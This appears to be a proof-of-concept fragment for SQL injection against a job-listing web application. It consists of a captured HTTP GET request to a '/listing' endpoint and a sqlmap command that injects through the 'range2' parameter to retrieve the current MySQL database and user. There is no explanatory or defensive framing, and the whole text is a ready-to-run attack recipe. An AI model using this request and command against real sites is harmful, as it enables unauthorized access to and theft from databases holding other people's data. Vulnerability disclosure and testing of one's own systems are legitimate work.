```
GET /listing?cat=6&filter=1&job-type=1&keywords=Mr.&location=1&order=desc&placeid=US&placetype=country&range1=1&range2=1&salary-type=1&sort=id&subcat= HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Host: 
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive


python3 sqlmap.py -r test.txt -p range2 --dbms=mysql --current-db --current-user --batch
```

